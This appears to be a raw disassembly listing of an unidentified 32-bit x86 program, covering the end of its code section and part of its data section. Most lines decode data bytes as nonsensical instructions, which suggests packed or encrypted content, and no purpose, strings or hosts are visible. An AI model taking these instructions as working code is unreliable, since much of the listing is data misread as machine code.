  411c95:	mov    BYTE PTR [esi+edi*1],dh
  411c98:	ret    0x7c32
  411c9b:	outs   dx,DWORD PTR ds:[esi]
  411c9c:	retf   0x65f2
  411c9f:	sar    bh,cl
  411ca1:	jb     0x411c35
  411ca3:	adc    al,0x44
  411ca5:	inc    DWORD PTR [ebx+0x47]
  411ca8:	xchg   ebp,eax
  411ca9:	loop   0x411c37
  411cab:	in     al,dx
  411cac:	xlat   BYTE PTR ds:[ebx]
  411cad:	stos   BYTE PTR es:[edi],al
  411cae:	mov    BYTE PTR [ebp-0x17],ch
  411cb1:	xchg   ebx,eax
  411cb2:	cmp    edx,eax
  411cb4:	push   ecx
  411cb5:	in     eax,dx
  411cb6:	mov    ecx,0xfe802ae2
  411cbb:	clc    
  411cbc:	in     al,0xba
  411cbe:	sub    BYTE PTR ds:0xb2d6eaf0,bh
  411cc4:	les    ecx,FWORD PTR [ebp-0x1a]
  411cc7:	int3   
  411cc8:	ins    DWORD PTR es:[edi],dx
  411cc9:	add    BYTE PTR [edi+0x14],ah
  411ccc:	push   cs
  411ccd:	mov    DWORD PTR [ebx],esi
  411ccf:	mov    BYTE PTR [edi+0x664d396f],cl
  411cd5:	lahf   
  411cd6:	int    0xf
  411cd8:	sar    BYTE PTR [edx],cl
  411cda:	repnz dec ebp
  411cdc:	cmp    dl,BYTE PTR [edi]
  411cde:	out    0xfb,eax
  411ce0:	je     0x411d47
  411ce2:	pop    ebx
  411ce3:	out    dx,al
  411ce4:	or     DWORD PTR [edi+0xc22158c],0x52
  411ceb:	inc    esp
  411cec:	mov    WORD PTR [ecx],es
  411cee:	add    BYTE PTR [edi-0x1b4c4103],cl
  411cf4:	mov    dh,0x8c
  411cf6:	mov    ah,0xad
  411cf8:	fisttp WORD PTR [ebp+0x47]
  411cfb:	fwait
  411cfc:	and    ecx,0xfffffff6
  411cff:	fcmove st,st(7)
  411d01:	pop    es
  411d02:	push   ebp
  411d03:	in     eax,0xc5
  411d05:	call   FWORD PTR [ebx+ecx*1-0x55]
  411d09:	pop    ecx
  411d0a:	jno    0x411c9d
  411d0c:	mov    edi,0x154b5bf2
  411d11:	repz test al,0x24
  411d14:	sub    bh,bh
  411d16:	and    ecx,ecx
  411d18:	sbb    cl,BYTE PTR [esi+esi*2+0x5d]
  411d1c:	dec    ecx
  411d1d:	jmp    0xeea4:0x20217ae8
  411d24:	sub    ah,BYTE PTR [edi-0x5817bd1f]
  411d2a:	mov    ecx,0x9e1a0ab7
  411d2f:	mov    cl,0x29
  411d31:	inc    ebp
  411d32:	int3   
  411d33:	inc    ebp
  411d34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d35:	call   0xb608:0x7960d9d0
  411d3c:	bound  edi,QWORD PTR [esi-0x6f]
  411d3f:	div    dl
  411d41:	mov    bl,0x3a
  411d43:	mov    esp,0x661ac47d
  411d48:	mov    fs,WORD PTR ds:0x89ffc982
  411d4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d4f:	in     al,dx
  411d50:	pop    es
  411d51:	jmp    0xacddd1ba
  411d56:	nop/reserved BYTE PTR [esi-0x3116db0]
  411d5d:	push   ecx
  411d5e:	arpl   WORD PTR ds:0x8c377940,di
  411d64:	inc    eax
  411d65:	shl    ecx,cl
  411d67:	out    0x50,al
  411d69:	inc    ebx
  411d6a:	jb     0x411d3a
  411d6c:	mov    cs,WORD PTR [ecx-0x7c]
  411d6f:	data16 sub BYTE PTR [edi+eiz*8+0x31],bh
  411d74:	scas   al,BYTE PTR es:[edi]
  411d75:	sub    ebx,DWORD PTR [ebx+0x6a8cfdf4]
  411d7b:	sahf   
  411d7c:	clc    
  411d7d:	loopne 0x411d64
  411d7f:	push   0x50
  411d81:	and    al,0xee
  411d83:	add    BYTE PTR ds:0x9fca337d,0x4d
  411d8a:	dec    eax
  411d8b:	test   eax,0xa91e791
  411d90:	pop    ds
  411d91:	mov    eax,ds:0xca03cf15
  411d96:	cli    
  411d97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d98:	ss push 0x5c
  411d9b:	or     DWORD PTR [ecx+eax*8],eax
  411d9e:	stc    
  411d9f:	adc    edi,esp
  411da1:	xlat   BYTE PTR ds:[ebx]
  411da2:	ret    0xff7a
  411da5:	mov    bl,0xcb
  411da7:	pop    esp
  411da8:	xor    BYTE PTR [esi-0x8],dh
  411dab:	or     DWORD PTR [ecx+0x68159ff8],ebp
  411db1:	cli    
  411db2:	sub    dl,BYTE PTR [edx]
  411db4:	adc    ebp,ebp
  411db6:	stos   DWORD PTR es:[edi],eax
  411db7:	mov    dh,bh
  411db9:	and    BYTE PTR [esi+ebx*2],0x77
  411dbd:	in     al,dx
  411dbe:	fld    QWORD PTR [edi+edx*1-0x45624c12]
  411dc5:	shr    BYTE PTR [esi+edi*2],cl
  411dc8:	dec    edi
  411dc9:	xor    DWORD PTR [ebx+0x23816f61],edi
  411dcf:	mov    ah,0xb1
  411dd1:	out    dx,eax
  411dd2:	jmp    0x411ddf
  411dd4:	push   edi
  411dd5:	jae    0x411e2b
  411dd7:	shl    DWORD PTR [ebx-0x24],1
  411dda:	fsubr  st(5),st
  411ddc:	push   esp
  411ddd:	call   0xd632:0x2aac697e
  411de4:	xor    edx,ebx
  411de6:	call   0xdf3b:0x8b78ae36
  411ded:	or     eax,0x5467c25a
  411df2:	dec    ecx
  411df3:	mov    eax,ds:0x25474c27
  411df8:	scas   al,BYTE PTR es:[edi]
  411df9:	stos   DWORD PTR es:[edi],eax
  411dfa:	shl    edx,0x75
  411dfd:	mov    edi,0x5a8f3b70
  411e02:	cmp    eax,0xe2cc8e00
  411e07:	jbe    0x411dc5
  411e09:	cmp    al,0x8d
  411e0b:	jmp    0x411e8a
  411e0d:	(bad)  
  411e0e:	scas   eax,DWORD PTR es:[edi]
  411e0f:	cmp    al,0x51
  411e11:	pop    edi
  411e12:	xchg   esi,eax
  411e13:	push   ebx
  411e14:	call   0x2a1d:0xa00718c7
  411e1b:	mov    edx,0x2628073c
  411e20:	lods   al,BYTE PTR ds:[esi]
  411e21:	xchg   esp,eax
  411e22:	sbb    eax,DWORD PTR [eax+0x3ee79186]
  411e28:	loop   0x411e61
  411e2a:	mov    dl,0x4
  411e2c:	jmp    0x83bb:0x7c2a9796
  411e33:	outs   dx,DWORD PTR ds:[esi]
  411e34:	pushf  
  411e35:	leave  
  411e36:	dec    edi
  411e37:	mov    edx,DWORD PTR ds:0x78b1885
  411e3d:	dec    edi
  411e3e:	adc    eax,0xbd6978e7
  411e43:	xor    ch,ah
  411e45:	nop
  411e46:	inc    edx
  411e47:	mov    eax,ds:0x360ab5ef
  411e4c:	fs jecxz 0x411eb7
  411e4f:	in     al,0xb9
  411e51:	(bad)  
  411e52:	lods   al,BYTE PTR ds:[esi]
  411e53:	sbb    dh,dh
  411e55:	fld    DWORD PTR [edx+0x23]
  411e58:	dec    esi
  411e59:	mov    ah,0xb2
  411e5b:	pop    edi
  411e5c:	dec    edx
  411e5d:	les    ebp,FWORD PTR [ebx+eiz*2-0x1be959e1]
  411e64:	mov    dh,0xe7
  411e66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e67:	mov    edx,0x818b02a6
  411e6c:	mov    dl,0x52
  411e6e:	out    0x6a,eax
  411e70:	mov    bh,ch
  411e72:	push   edx
  411e73:	stos   DWORD PTR es:[edi],eax
  411e74:	arpl   WORD PTR [edx-0x4d],di
  411e77:	xor    esp,DWORD PTR [esi+eiz*4+0x50]
  411e7b:	mov    bl,0x17
  411e7d:	test   DWORD PTR [esi-0x1603433b],eax
  411e83:	inc    ebx
  411e84:	cmp    DWORD PTR [esi+0x54],eax
  411e87:	pop    esi
  411e88:	je     0x411e96
  411e8e:	mov    eax,DWORD PTR [ebp+0x8]
  411e91:	jmp    0x411eaf
  411e96:	mov    eax,DWORD PTR [ebp-0x4]
  411e99:	xor    eax,edx
  411e9b:	add    eax,ecx
  411e9d:	jmp    0x411eaf
  411ea2:	mov    eax,DWORD PTR [ebp-0x4]
  411ea5:	xor    eax,0x7510854
  411eaa:	add    eax,0x32729b
  411eaf:	leave  
  411eb0:	ret    0x4

Disassembly of section .data:

00412000 <.data>:
  412000:	sub    BYTE PTR [ecx],0x1
  412003:	add    BYTE PTR [edx-0x5dfffed7],dl
  412009:	sub    DWORD PTR [ecx],eax
  41200b:	add    BYTE PTR [eax-0x41fffed7],dh
  412011:	sub    DWORD PTR [ecx],eax
  412013:	add    ah,dl
  412015:	sub    DWORD PTR [ecx],eax
  412017:	add    ah,ah
  412019:	sub    DWORD PTR [ecx],eax
  41201b:	add    dh,dh
  41201d:	sub    DWORD PTR [ecx],eax
  41201f:	add    BYTE PTR [edx],al
  412021:	sub    al,BYTE PTR [ecx]
  412023:	add    BYTE PTR [edx+ebp*1],dl
  412026:	add    DWORD PTR [eax],eax
  412028:	and    BYTE PTR [edx],ch
  41202a:	add    DWORD PTR [eax],eax
  41202c:	sub    al,BYTE PTR cs:[ecx]
  41202f:	add    BYTE PTR [esi+0x2a],al
  412032:	add    DWORD PTR [eax],eax
  412034:	pop    eax
  412035:	sub    al,BYTE PTR [ecx]
  412037:	add    BYTE PTR [esi+0x2a],ah
  41203a:	add    DWORD PTR [eax],eax
  41203c:	js     0x412068
  41203e:	add    DWORD PTR [eax],eax
  412040:	mov    gs,WORD PTR [edx]
  412042:	add    DWORD PTR [eax],eax
  412044:	sahf   
  412045:	sub    al,BYTE PTR [ecx]
  412047:	add    BYTE PTR [edx-0x35fffed6],dh
  41204d:	sub    al,BYTE PTR [ecx]
  41204f:	add    dh,bl
  412051:	sub    al,BYTE PTR [ecx]
  412053:	add    dl,ch
  412055:	sub    al,BYTE PTR [ecx]
  412057:	add    ah,bh
  412059:	sub    al,BYTE PTR [ecx]
  41205b:	add    BYTE PTR [edx],dl
  41205d:	sub    eax,DWORD PTR [ecx]
  41205f:	add    BYTE PTR [esi],bl
  412061:	sub    eax,DWORD PTR [ecx]
  412063:	add    BYTE PTR [ebx+ebp*1],ch
  412066:	add    DWORD PTR [eax],eax
  412068:	inc    eax
  412069:	sub    eax,DWORD PTR [ecx]
  41206b:	add    BYTE PTR [esi+0x2b],cl
  41206e:	add    DWORD PTR [eax],eax
  412070:	sub    eax,DWORD PTR fs:[ecx]
  412073:	add    BYTE PTR [edx+0x2b],dh
  412076:	add    DWORD PTR [eax],eax
  412078:	test   BYTE PTR [ebx],ch
  41207a:	add    DWORD PTR [eax],eax
  41207c:	mov    gs,WORD PTR [ebx]
  41207e:	add    DWORD PTR [eax],eax
  412080:	sahf   
  412081:	sub    eax,DWORD PTR [ecx]
  412083:	add    BYTE PTR [eax-0x3bfffed5],bh
  412089:	sub    eax,DWORD PTR [ecx]
  41208b:	add    al,dl
  41208d:	sub    eax,DWORD PTR [ecx]
  41208f:	add    ah,ch
  412091:	sub    eax,DWORD PTR [ecx]
  412093:	add    ah,bh
  412095:	sub    eax,DWORD PTR [ecx]
  412097:	add    BYTE PTR [edx],cl
  412099:	sub    al,0x1
  41209b:	add    BYTE PTR [eax],bl
  41209d:	sub    al,0x1
  41209f:	add    BYTE PTR [esp+ebp*1],ah
  4120a2:	add    DWORD PTR [eax],eax
  4120a4:	cmp    BYTE PTR [ecx+eax*1],ch
  4120a7:	add    BYTE PTR [esi+0x2c],cl
  4120aa:	add    DWORD PTR [eax],eax
  4120ac:	pop    edx
  4120ad:	sub    al,0x1
  4120af:	add    BYTE PTR [edx+0x2c],ch
  4120b2:	add    DWORD PTR [eax],eax
  4120b4:	jl     0x4120e2
  4120b6:	add    DWORD PTR [eax],eax
  4120b8:	mov    gs,WORD PTR [ecx+eax*1]
  4120bb:	add    BYTE PTR [eax-0x47fffed4],ah
  4120c1:	sub    al,0x1
  4120c3:	add    al,cl
  4120c5:	sub    al,0x1
  4120c7:	add    dh,dl
  4120c9:	sub    al,0x1
  4120cb:	add    ah,ah
  4120cd:	sub    al,0x1
  4120cf:	add    dh,dh
  4120d1:	sub    al,0x1
  4120d3:	add    BYTE PTR [esi],al
  4120d5:	sub    eax,0x2d140001
  4120da:	add    DWORD PTR [eax],eax
  4120dc:	es sub eax,0x2d3c0001
  4120e2:	add    DWORD PTR [eax],eax
  4120e4:	dec    edx
  4120e5:	sub    eax,0x2d5a0001
  4120ea:	add    DWORD PTR [eax],eax
  4120ec:	push   0x2d
  4120ee:	add    DWORD PTR [eax],eax
  4120f0:	je     0x41211f
  4120f2:	add    DWORD PTR [eax],eax
  4120f4:	test   BYTE PTR ds:0x2d900001,ch
  4120fa:	add    DWORD PTR [eax],eax
  4120fc:	sahf   
  4120fd:	sub    eax,0x2daa0001
  412102:	add    DWORD PTR [eax],eax
  412104:	mov    eax,0xd000012d
  412109:	sub    eax,0x2dde0001
  41210e:	add    DWORD PTR [eax],eax
  412110:	out    dx,al
  412111:	sub    eax,0x2dfe0001
  412116:	add    DWORD PTR [eax],eax
  412118:	or     al,0x2e
  41211a:	add    DWORD PTR [eax],eax
  41211c:	push   ds
  41211d:	add    DWORD PTR cs:[eax],eax
  412120:	xor    ch,BYTE PTR [esi]
  412122:	add    DWORD PTR [eax],eax
  412124:	dec    esi
  412125:	add    DWORD PTR cs:[eax],eax
  412128:	pop    esi
  412129:	add    DWORD PTR cs:[eax],eax
  41212c:	je     0x41215c
  41212e:	add    DWORD PTR [eax],eax
  412130:	xchg   BYTE PTR [esi],ch
  412132:	add    DWORD PTR [eax],eax
  412134:	call   0x12e:0xac00012e
  41213b:	add    BYTE PTR [esi-0x33fffed2],bh
  412141:	add    DWORD PTR cs:[eax],eax
  412144:	fisubr DWORD PTR [esi]
  412146:	add    DWORD PTR [eax],eax
  412148:	out    dx,al
  412149:	add    DWORD PTR cs:[eax],eax
  41214c:	cli    
  41214d:	add    DWORD PTR cs:[eax],eax
  412150:	push   cs
  412151:	das    
  412152:	add    DWORD PTR [eax],eax
  412154:	push   ds
  412155:	das    
  412156:	add    DWORD PTR [eax],eax
  412158:	cs das 
  41215a:	add    DWORD PTR [eax],eax
  41215c:	inc    eax
  41215d:	das    
  41215e:	add    DWORD PTR [eax],eax
  412160:	pop    eax
  412161:	das    
  412162:	add    DWORD PTR [eax],eax
  412164:	outs   dx,BYTE PTR ds:[esi]
  412165:	das    
  412166:	add    DWORD PTR [eax],eax
  412168:	jle    0x412199
  41216a:	add    DWORD PTR [eax],eax
  41216c:	call   0x12f:0xae00012f
  412173:	add    BYTE PTR [edx-0x39fffed1],bh
  412179:	das    
  41217a:	add    DWORD PTR [eax],eax
  41217c:	aam    0x2f
  41217e:	add    DWORD PTR [eax],eax
  412180:	in     al,0x2f
  412182:	add    DWORD PTR [eax],eax
  412184:	cli    
  412185:	das    
  412186:	add    DWORD PTR [eax],eax
  412188:	or     al,0x30
  41218a:	add    DWORD PTR [eax],eax
  41218c:	push   ss
  41218d:	xor    BYTE PTR [ecx],al
  41218f:	add    BYTE PTR [esi],ch
  412191:	xor    BYTE PTR [ecx],al
  412193:	add    BYTE PTR [edx],bh
  412195:	xor    BYTE PTR [ecx],al
  412197:	add    BYTE PTR [eax+esi*1+0x1],cl
  41219b:	add    BYTE PTR [eax+0x30],bl
  41219e:	add    DWORD PTR [eax],eax
  4121a0:	jb     0x4121d2
  4121a2:	add    DWORD PTR [eax],eax
  4121a4:	jle    0x4121d6
  4121a6:	add    DWORD PTR [eax],eax
  4121a8:	mov    WORD PTR [eax],?
  4121aa:	add    DWORD PTR [eax],eax
  4121ac:	mov    ds:0xb8000130,al
  4121b1:	xor    BYTE PTR [ecx],al
  4121b3:	add    BYTE PTR [eax],al
  4121b5:	add    BYTE PTR [eax],al
  4121b7:	add    ah,dl
  4121b9:	xor    BYTE PTR [ecx],al
  4121bb:	add    al,ch
  4121bd:	xor    BYTE PTR [ecx],al
  4121bf:	add    BYTE PTR [eax],al
  4121c1:	xor    DWORD PTR [ecx],eax
  4121c3:	add    BYTE PTR [esi],dl
  4121c5:	xor    DWORD PTR [ecx],eax
  4121c7:	add    BYTE PTR [esi],ah
  4121c9:	xor    DWORD PTR [ecx],eax
  4121cb:	add    BYTE PTR [ecx+esi*1],dh
  4121ce:	add    DWORD PTR [eax],eax
  4121d0:	dec    esp
  4121d1:	xor    DWORD PTR [ecx],eax
  4121d3:	add    BYTE PTR [edx+0x31],bl
  4121d6:	add    DWORD PTR [eax],eax
  4121d8:	xor    WORD PTR [ecx],ax
  4121db:	add    BYTE PTR [eax+0x31],bh
  4121de:	add    DWORD PTR [eax],eax
  4121e0:	xchg   esp,eax
  4121e1:	xor    DWORD PTR [ecx],eax
  4121e3:	add    BYTE PTR [edx-0x49fffecf],ah
  4121e9:	xor    DWORD PTR [ecx],eax
  4121eb:	add    dh,al
  4121ed:	xor    DWORD PTR [ecx],eax
  4121ef:	add    dl,dl
  4121f1:	xor    DWORD PTR [ecx],eax
  4121f3:	add    ah,ah
  4121f5:	xor    DWORD PTR [ecx],eax
  4121f7:	add    ah,ch
  4121f9:	xor    DWORD PTR [ecx],eax
  4121fb:	add    ah,bh
  4121fd:	xor    DWORD PTR [ecx],eax
  4121ff:	add    BYTE PTR [esi],cl
  412201:	xor    al,BYTE PTR [ecx]
  412203:	add    BYTE PTR [edx+esi*1],bl
  412206:	add    DWORD PTR [eax],eax
  412208:	xor    al,BYTE PTR cs:[ecx]
  41220b:	add    BYTE PTR [eax+0x32],al
  41220e:	add    DWORD PTR [eax],eax
  412210:	push   esi
  412211:	xor    al,BYTE PTR [ecx]
  412213:	add    BYTE PTR [esi+0x32],ah
  412216:	add    DWORD PTR [eax],eax
  412218:	js     0x41224c
  41221a:	add    DWORD PTR [eax],eax
  41221c:	mov    dh,BYTE PTR [edx]
  41221e:	add    DWORD PTR [eax],eax
  412220:	call   0x132:0xb0000132
  412227:	add    al,al
  412229:	xor    al,BYTE PTR [ecx]
  41222b:	add    ah,cl
  41222d:	xor    al,BYTE PTR [ecx]
  41222f:	add    dl,ah
  412231:	xor    al,BYTE PTR [ecx]
  412233:	add    ah,dh
  412235:	xor    al,BYTE PTR [ecx]
  412237:	add    BYTE PTR [esi],al
  412239:	xor    eax,DWORD PTR [ecx]
  41223b:	add    BYTE PTR [esi],dl
  41223d:	xor    eax,DWORD PTR [ecx]
  41223f:	add    BYTE PTR [ebx+esi*1],ch
  412242:	add    DWORD PTR [eax],eax
  412244:	cmp    dh,BYTE PTR [ebx]
  412246:	add    DWORD PTR [eax],eax
  412248:	push   eax
  412249:	xor    eax,DWORD PTR [ecx]
  41224b:	add    BYTE PTR [ebx+esi*1+0x1],ah
  41224f:	add    BYTE PTR [edx+0x33],bh
  412252:	add    DWORD PTR [eax],eax
  412254:	cwde   
  412255:	xor    eax,DWORD PTR [ecx]
  412257:	add    BYTE PTR [eax-0x43fffecd],dh
  41225d:	xor    eax,DWORD PTR [ecx]
  41225f:	add    dh,cl
  412261:	xor    eax,DWORD PTR [ecx]
  412263:	add    dl,bl
  412265:	xor    eax,DWORD PTR [ecx]
  412267:	add    dh,ch
  412269:	xor    eax,DWORD PTR [ecx]
  41226b:	add    BYTE PTR [esi],al
  41226d:	xor    al,0x1
  41226f:	add    BYTE PTR [edx],dl
  412271:	xor    al,0x1
  412273:	add    BYTE PTR [eax],ah
  412275:	xor    al,0x1
  412277:	add    BYTE PTR [edx],dh
  412279:	xor    al,0x1
  41227b:	add    BYTE PTR [edx+0x34],al
  41227e:	add    DWORD PTR [eax],eax
  412280:	dec    esp
  412281:	xor    al,0x1
  412283:	add    BYTE PTR [eax],al
  412285:	add    BYTE PTR [eax],al
  412287:	add    BYTE PTR [esi+0x34],ah
  41228a:	add    DWORD PTR [eax],eax
  41228c:	je     0x4122c2
  41228e:	add    DWORD PTR [eax],eax
  412290:	xor    BYTE PTR [ecx+eax*1],0x0
  412294:	xchg   esp,eax
  412295:	xor    al,0x1
  412297:	add    BYTE PTR [eax],al
  412299:	add    BYTE PTR [eax],al
  41229b:	add    BYTE PTR [esi-0x43fffecc],ch
  4122a1:	xor    al,0x1
  4122a3:	add    dh,cl
  4122a5:	xor    al,0x1
  4122a7:	add    ah,bl
  4122a9:	xor    al,0x1
  4122ab:	add    ah,ah
  4122ad:	xor    al,0x1
  4122af:	add    ah,dh
  4122b1:	xor    al,0x1
  4122b3:	add    BYTE PTR [eax],al
  4122b5:	xor    eax,0x350e0001
  4122ba:	add    DWORD PTR [eax],eax
  4122bc:	push   ss
  4122bd:	xor    eax,0x35220001
  4122c2:	add    DWORD PTR [eax],eax
  4122c4:	sub    al,0x35
  4122c6:	add    DWORD PTR [eax],eax
  4122c8:	ss xor eax,0x353e0001
  4122ce:	add    DWORD PTR [eax],eax
  4122d0:	dec    eax
  4122d1:	xor    eax,0x35520001
  4122d6:	add    DWORD PTR [eax],eax
  4122d8:	pop    esp
  4122d9:	xor    eax,0x35680001
  4122de:	add    DWORD PTR [eax],eax
  4122e0:	je     0x412317
  4122e2:	add    DWORD PTR [eax],eax
  4122e4:	jle    0x41231b
  4122e6:	add    DWORD PTR [eax],eax
  4122e8:	mov    BYTE PTR ds:0x35920001,dh
  4122ee:	add    DWORD PTR [eax],eax
  4122f0:	mov    al,ds:0xa8000135
  4122f5:	xor    eax,0x35b40001
  4122fa:	add    DWORD PTR [eax],eax
  4122fc:	mov    esi,0xc8000135
  412301:	xor    eax,0x35d20001
  412306:	add    DWORD PTR [eax],eax
  412308:	fidiv  WORD PTR ds:0x35ec0001
  41230e:	add    DWORD PTR [eax],eax
  412310:	clc    
  412311:	xor    eax,0x36000001
  412316:	add    DWORD PTR [eax],eax
  412318:	or     al,0x36
  41231a:	add    DWORD PTR [eax],eax
  41231c:	push   ss
  41231d:	add    DWORD PTR ss:[eax],eax
  412320:	and    BYTE PTR [esi],dh
  412322:	add    DWORD PTR [eax],eax
  412324:	sub    BYTE PTR [esi],dh
  412326:	add    DWORD PTR [eax],eax
  412328:	xor    dh,BYTE PTR [esi]
  41232a:	add    DWORD PTR [eax],eax
  41232c:	cmp    al,0x36
  41232e:	add    DWORD PTR [eax],eax
  412330:	inc    esi
  412331:	add    DWORD PTR ss:[eax],eax
  412334:	push   eax
  412335:	add    DWORD PTR ss:[eax],eax
  412338:	pop    edx
  412339:	add    DWORD PTR ss:[eax],eax
  41233c:	fs add DWORD PTR ss:[eax],eax
  412340:	outs   dx,BYTE PTR ds:[esi]
  412341:	add    DWORD PTR ss:[eax],eax
  412344:	xor    BYTE PTR [esi],0x1
  412347:	add    BYTE PTR [edx+0x136],dl
  41234d:	add    BYTE PTR [eax],al
  41234f:	add    BYTE PTR [eax-0x3ffffeca],ch
  412355:	add    DWORD PTR ss:[eax],eax
  412358:	fdiv   DWORD PTR [esi]
  41235a:	add    DWORD PTR [eax],eax
  41235c:	hlt    
  41235d:	add    DWORD PTR ss:[eax],eax
  412360:	or     al,0x37
  412362:	add    DWORD PTR [eax],eax
  412364:	and    al,0x37
  412366:	add    DWORD PTR [eax],eax
  412368:	add    BYTE PTR [eax],al
  41236a:	add    BYTE PTR [eax],al
  41236c:	inc    esi
  41236d:	aaa    
  41236e:	add    DWORD PTR [eax],eax
  412370:	pop    esp
  412371:	aaa    
  412372:	add    DWORD PTR [eax],eax
  412374:	jo     0x4123ad
  412376:	add    DWORD PTR [eax],eax
  412378:	jle    0x4123b1
  41237a:	add    DWORD PTR [eax],eax
  41237c:	mov    dh,BYTE PTR [edi]
  41237e:	add    DWORD PTR [eax],eax
  412380:	cwde   
  412381:	aaa    
  412382:	add    DWORD PTR [eax],eax
  412384:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412385:	aaa    
  412386:	add    DWORD PTR [eax],eax
  412388:	mov    ah,0x37
  41238a:	add    DWORD PTR [eax],eax
  41238c:	les    esi,FWORD PTR [edi]
  41238e:	add    DWORD PTR [eax],eax
  412390:	into   
  412391:	aaa    
  412392:	add    DWORD PTR [eax],eax
  412394:	fidiv  DWORD PTR [edi]
  412396:	add    DWORD PTR [eax],eax
  412398:	repnz aaa 
  41239a:	add    DWORD PTR [eax],eax
  41239c:	push   es
  41239d:	cmp    BYTE PTR [ecx],al
  41239f:	add    BYTE PTR [eax],bl
  4123a1:	cmp    BYTE PTR [ecx],al
  4123a3:	add    BYTE PTR [eax],ch
  4123a5:	cmp    BYTE PTR [ecx],al
  4123a7:	add    BYTE PTR [eax+edi*1],dh
  4123aa:	add    DWORD PTR [eax],eax
  4123ac:	dec    edx
  4123ad:	cmp    BYTE PTR [ecx],al
  4123af:	add    BYTE PTR [eax+edi*1+0x1],bl
  4123b3:	add    BYTE PTR [eax+edi*1+0x1],ch
  4123b7:	add    BYTE PTR [eax+edi*1+0x389a0001],al
  4123be:	add    DWORD PTR [eax],eax
  4123c0:	stos   BYTE PTR es:[edi],al
  4123c1:	cmp    BYTE PTR [ecx],al
  4123c3:	add    BYTE PTR [esi-0x35fffec8],dh
  4123c9:	cmp    BYTE PTR [ecx],al
  4123cb:	add    dh,bl
  4123cd:	cmp    BYTE PTR [ecx],al
  4123cf:	add    dh,ch
  4123d1:	cmp    BYTE PTR [ecx],al
  4123d3:	add    dh,bh
  4123d5:	cmp    BYTE PTR [ecx],al
  4123d7:	add    BYTE PTR [esi],cl
  4123d9:	cmp    DWORD PTR [ecx],eax
  4123db:	add    BYTE PTR [ecx+edi*1],bl
  4123de:	add    DWORD PTR [eax],eax
  4123e0:	sub    bh,BYTE PTR [ecx]
  4123e2:	add    DWORD PTR [eax],eax
  4123e4:	cmp    BYTE PTR [ecx],bh
  4123e6:	add    DWORD PTR [eax],eax
  4123e8:	inc    esp
  4123e9:	cmp    DWORD PTR [ecx],eax
  4123eb:	add    BYTE PTR [eax+0x39],bl
  4123ee:	add    DWORD PTR [eax],eax
  4123f0:	cmp    DWORD PTR fs:[ecx],eax
  4123f3:	add    BYTE PTR [ecx+edi*1+0x1],dh
  4123f7:	add    BYTE PTR [esi+0x39],bh
  4123fa:	add    DWORD PTR [eax],eax
  4123fc:	xchg   esp,eax
  4123fd:	cmp    DWORD PTR [ecx],eax
  4123ff:	add    BYTE PTR [esi-0x45fffec7],bl
  412405:	cmp    DWORD PTR [ecx],eax
  412407:	add    al,dl
  412409:	cmp    DWORD PTR [ecx],eax
  41240b:	add    al,ah
  41240d:	cmp    DWORD PTR [ecx],eax
  41240f:	add    al,dh
  412411:	cmp    DWORD PTR [ecx],eax
  412413:	add    ah,bh
  412415:	cmp    DWORD PTR [ecx],eax
  412417:	add    BYTE PTR [eax],cl
  412419:	cmp    al,BYTE PTR [ecx]
  41241b:	add    BYTE PTR [eax],al
  41241d:	add    BYTE PTR [eax],al
  41241f:	add    BYTE PTR [edx+edi*1],ah
  412422:	add    DWORD PTR [eax],eax
	...
  41242c:	jmp    0x0:0x4d49a9
  412433:	add    BYTE PTR [edx],al
  412435:	add    BYTE PTR [eax],al
  412437:	add    BYTE PTR [esi],bh
  412439:	add    BYTE PTR [eax],al
  41243b:	add    BYTE PTR [ecx-0x76fffcc8],cl
  412441:	sub    al,0x3
	...
  41244b:	add    dl,ch
  41244d:	test   eax,0x4d49
  412452:	add    BYTE PTR [eax],al
  412454:	jp     0x41247a
  412456:	add    DWORD PTR [eax],eax
  412458:	add    DWORD PTR [eax],eax
  41245a:	add    BYTE PTR [eax],al
  41245c:	add    DWORD PTR [eax],eax
  41245e:	add    BYTE PTR [eax],al
  412460:	add    DWORD PTR [eax],eax
  412462:	add    BYTE PTR [eax],al
  412464:	jo     0x41248a
  412466:	add    DWORD PTR [eax],eax
  412468:	je     0x41248e
  41246a:	add    DWORD PTR [eax],eax
  41246c:	js     0x412492
  41246e:	add    DWORD PTR [eax],eax
  412470:	je     0x4124bc
  412472:	add    BYTE PTR [eax],al
  412474:	mov    esp,DWORD PTR [ecx+eax*1]
  412477:	add    BYTE PTR [eax],al
  412479:	add    BYTE PTR [eax+0x48],cl
  41247c:	push   ebx
  41247d:	aaa    
  41247e:	inc    edi
  41247f:	inc    esi
  412480:	js     0x4124bb
  412482:	fs ja  0x4124b8
  412485:	data16 cs je 0x4124f8
  412489:	jo     0x41248b
  41248b:	aas    
  41248c:	inc    edi
  41248d:	outs   dx,BYTE PTR gs:[esi]
  41248f:	gs jb  0x4124f3
  412492:	je     0x4124f9
  412494:	push   ebx
  412495:	je     0x4124f8
  412497:	je     0x4124fe
  412499:	inc    eax
  41249a:	inc    eax
  41249b:	pop    ecx
  41249c:	inc    edi
  41249d:	push   eax
  41249e:	inc    ecx
  41249f:	dec    edx
  4124a0:	push   eax
  4124a1:	inc    ecx
  4124a2:	inc    esi
  4124a3:	dec    eax
  4124a4:	dec    ebp
  4124a5:	push   eax
  4124a6:	inc    ecx
  4124a7:	inc    esi
  4124a8:	cmp    al,0x56
	...
  4124b6:	add    BYTE PTR [eax],al
  4124b8:	pop    eax
  4124b9:	and    eax,0x1
  4124be:	add    BYTE PTR [eax],al
  4124c0:	add    BYTE PTR [eax],al
  4124c2:	add    BYTE PTR [eax],al
  4124c4:	enter  0x130,0x0
  4124c8:	add    BYTE PTR [eax],ah
  4124ca:	add    DWORD PTR [eax],eax
  4124cc:	adc    BYTE PTR [edi],ah
  4124ce:	add    DWORD PTR [eax],eax
	...
  4124d8:	pop    eax
  4124d9:	xor    al,0x1
  4124db:	add    BYTE PTR [eax-0x1ffffedf],bh
  4124e1:	daa    
  4124e2:	add    DWORD PTR [eax],eax
	...
  4124ec:	mov    al,ds:0x88000134
  4124f1:	and    al,BYTE PTR [ecx]
  4124f3:	add    ah,dh
  4124f5:	daa    
  4124f6:	add    DWORD PTR [eax],eax
	...
  412500:	pushf  
  412501:	add    DWORD PTR ss:[eax],eax
  412504:	pushf  
  412505:	and    al,BYTE PTR [ecx]
  412507:	add    BYTE PTR [eax+0x128],ch
